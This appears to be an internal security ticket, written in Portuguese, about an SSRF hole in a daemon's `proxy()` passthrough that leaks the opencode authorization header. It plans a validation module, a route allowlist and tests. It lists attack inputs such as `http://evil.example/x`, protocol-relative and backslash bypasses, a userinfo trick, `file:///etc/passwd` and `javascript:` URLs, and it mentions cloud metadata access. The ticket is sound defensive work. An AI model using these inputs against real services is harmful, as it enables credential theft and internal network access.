# RT-453 — SSRF no túnel do daemon: `proxy()` aceita URL absoluta em `req.path` e vaza a credencial do opencode

## Problem
`apps/daemon/src/index.ts:1877` monta o destino do passthrough com
`const url = new URL(req.path, OPENCODE_URL)` (base `http://127.0.0.1:4096`, linha 224) e dispara o
`fetch` da linha 1890 com `authorization: authHeader` (credencial do opencode, linha 745).

`req.path` é string livre dentro do envelope de op selado (`packages/protocol/src/types.ts:87-94`) e
**nenhuma** checagem anterior dentro de `proxy()` (linha 884) valida a forma: todas as ~45 guardas são
`req.path === "/__ocr/…"` exatas ou o regex `^\/session\/[^/]+\/message$` (linha 1704/1883). Não existe
`startsWith("/")`, allowlist, nem limite de tamanho em lugar nenhum do caminho.

Com a semântica do WHATWG `new URL(rel, base)`, a base é **descartada** quando `rel` traz esquema ou
autoridade. Um cliente pareado (ou um par WS local) sela
`{"method":"GET","path":"http://evil.example/x"}` e o daemon faz a requisição para o host do atacante
**com o header `authorization` do opencode junto** — exfiltração de credencial. Variantes que um
`startsWith("/")" ingênuo não pega: `//evil.example/x` (protocol-relative) e `/\evil.example/x`
(a barra invertida vira barra nos esquemas especiais). Além do vazamento de credencial, o mesmo buraco
transforma o daemon em proxy SSRF para toda a rede local e para serviços loopback que só confiam em
127.0.0.1 (e para `169.254.169.254` em máquinas na nuvem) — o corpo da resposta volta selado pro
cliente pelo caminho normal (linha 3427), então é SSRF **com leitura**.

Os dois pontos de entrada de `proxy()` sofrem o mesmo: o envelope selado do relay
(`index.ts:3427`) e a ponte `/api` local (`index.ts:4252`).

## Approach
Padrão da casa (frameguard.ts/helloguard.ts/proxyauth.ts): **módulo puro fail-closed + fiação fina**.
Nada de `node:*`, `fetch`, relógio ou log dentro do módulo — `index.ts` roda `main()` no import e os
testes unitários nunca podem subir um daemon.

1. **`apps/daemon/src/pathguard.ts` (novo, puro)**
   - `export type PathRejectReason = "not-string" | "too-long" | "not-absolute" | "authority" |
     "control-char" | "query-or-fragment" | "traversal" | "bad-method" | "not-allowlisted"`
   - `export function relativePathVerdict(rawPath: unknown, rawMethod: unknown):
     { ok: true; path: string; method: OpRequest["method"] } | { ok: false; reason: PathRejectReason }`
     — regras avaliadas **nesta ordem**, uma causa por retorno:
     1. `typeof rawPath !== "string"` → `not-string`;
     2. `rawPath.length > 512` → `too-long`;
     3. contém `[\u0000-\u001F\u007F]` ou qualquer whitespace → `control-char` (o parser de URL remove
        espaço/CR/LF na borda, então ` http://evil` viraria absoluto);
     4. não começa com `/` → `not-absolute` (pega `http://`, `https:`, `file:`, `javascript:`, relativo);
     5. começa com `//` ou `/\`, ou contém `\` em qualquer posição → `authority`;
     6. contém `?` ou `#` → `query-or-fragment` (query viaja em `req.query`, que já é encodada por
        `searchParams.set`);
     7. algum segmento é exatamente `..` → `traversal`;
     8. `rawMethod` fora de `["GET","POST","DELETE","PATCH","PUT"]` → `bad-method`.
   - `export function allowedUpstreamPath(path: string): boolean` — allowlist ancorada, **uma tabela
     exportada** (`UPSTREAM_ROUTES`) para que rota nova do opencode tenha um único lugar pra entrar.
     Com `ID = [A-Za-z0-9_.-]{1,128}`, cobre exatamente o conjunto real usado pelos clientes:
     `^/(session|provider|permission|question)$`,
     `^/session/ID$`, `^/session/ID/(message|diff|revert|unrevert|abort)$`,
     `^/session/ID/permissions/ID$`, `^/question/ID/(reply|reject)$`.
     Qualquer outra coisa → `false` (fail-closed).
2. **`apps/daemon/src/index.ts`**
   - No **topo** de `proxy()` (antes da primeira guarda `/__ocr/…`, linha 885): roda
     `relativePathVerdict(req.path, req.method)`. Se `!ok`: `metrics.inc("ocr_op_path_rejected_total")`,
     `log("warn", "op path rejected", { reason })`, `audit("op.path-rejected", { reason })` e
     `return { id: req.id, status: 400, body: { error: "invalid path" } }`.
     **Nunca** logar/auditar/ecoar `req.path`, `req.body` ou a query (Constituição #1 — conteúdo de
     quadro selado não vira texto de log, e refletir o caminho é log-injection).
     Daí em diante usar `verdict.path`/`verdict.method`.
   - Imediatamente **antes** de `const url = new URL(req.path, OPENCODE_URL)` (1877): se
     `!allowedUpstreamPath(req.path)` → mesmo par métrica/log (reason `not-allowlisted`) e mesma
     resposta 400. Nenhuma rota `/__ocr/…` chega aqui: todas retornam antes, por igualdade exata.
   - Pequeno endurecimento no laço de query (1878-1880): ignorar entrada cujo valor não seja `string`
     (hoje um objeto viraria `"[object Object]"` na URL upstream).
3. **`docs/security.md`** — novo bullet em `## Threat notes` (seção começa na linha 109), no formato
   dos itens RT-390/RT-424: o que era possível, o que passou a ser validado, onde é contado
   (`ocr_op_path_rejected_total`) e a limitação residual (allowlist precisa ganhar linha nova quando o
   opencode ganhar rota nova — falha fechada, com 400 e log, nunca passthrough silencioso).

## Edge cases
- **Não quebrar o app**: as 17 formas upstream reais usadas hoje (`apps/web/src/lib/client.ts:1041`
  é o único construtor de `OpRequest`, mais `op()` em `index.ts:4252` e `proxy()` em `index.ts:1096`)
  precisam continuar passando — inclusive `GET /session/<id>/message?limit=50` (query em `req.query`,
  não no path) e `POST /session/<id>/permissions/<id>`.
- Ids de sessão/permissão/question vêm de corpo de resposta do opencode, não de texto do usuário, mas
  não são encodados no cliente: `ID` precisa aceitar `_ . -` além de alfanumérico, e `..` sozinho
  continua recusado pela regra 7.
- `/__ocr/download/chunk` (1201) e `/__ocr/screen/frame` (1691) dependem de `req.query` — a regra 6
  recusa `?` **no path**, nunca a query legítima.
- Frames de controle e caminhos vazios (`""`) caem em `not-absolute`, não em exceção.
- Rejeição não pode marcar dispositivo pareado como falho: **não** chamar `attributeAuthFailure`/
  `authFailures.record` (lição RT-424) — path inválido é 400, não falha de autenticação.
- Um `OPENCODE_URL` apontando para fora do loopback é configuração do operador, não entrada do
  atacante: o guard não tenta corrigir isso.
- Sem mudança de UI: nenhum screenshot é evidência desta task.

## Acceptance criteria
- `npx tsc --noEmit -p .` (ou `npm run typecheck`) verde, com output real no bloco EVIDENCE.
- `npm run test:unit` verde, com output real no EVIDENCE, contendo casos novos que provam:
  - `relativePathVerdict` recusa, com o `reason` exato de cada um: `"http://evil.example/x"`,
    `"https://evil.example"`, `"//evil.example/x"`, `"/\\evil.example/x"`, `" http://evil.example"`,
    `"\thttp://evil.example"`, `"http://127.0.0.1:4096@evil.example/"`, `"file:///etc/passwd"`,
    `"javascript:alert(1)"`, `"/a\r\nX"`, `"/x?y=1"`, `"/x#f"`, `"/../x"`, `""`, `"session"`,
    `123`/`null`/`{}` (não-string), string de 513 chars, e método `"TRACE"`/`"get"`.
  - `relativePathVerdict` aceita todos os `/__ocr/…` literais servidos por `proxy()` (basta uma
    amostra explícita: `/__ocr/settings`, `/__ocr/download/chunk`, `/__ocr/screen/frame`).
  - `allowedUpstreamPath` aceita as 17 formas reais (lista literal no teste) e recusa
    `"/global/health"`, `"/event"`, `"/session/a/b/c"`, `"/sessionX"`, `"/session/"`,
    `"/session/../provider"`.
  - Asserção de regressão lendo o `apps/daemon/src/index.ts` real: o arquivo contém
    exatamente **uma** ocorrência de `new URL(req.path` e contém `allowedUpstreamPath(` — se alguém
    adicionar um segundo passthrough sem guard, a bateria fica vermelha.
- `npm run test:e2e` verde (prova que o túnel real continua servindo `/session` e
  `/session/<id>/message` com a allowlist ligada).
- Prova manual no EVIDENCE via `node tools/browse.mjs`/`curl` loopback autenticado é opcional; se
  citada, tem que ser output real.
- `docs/security.md` ganha o bullet em `## Threat notes` (Constituição #5).
- Mensagem de commit cita RT-453 e o fato de a mudança **endurecer** a superfície de auth
  (Constituição #2), sem tocar crypto, allowlist de handshake, replay ou arquivo de estado 0600.
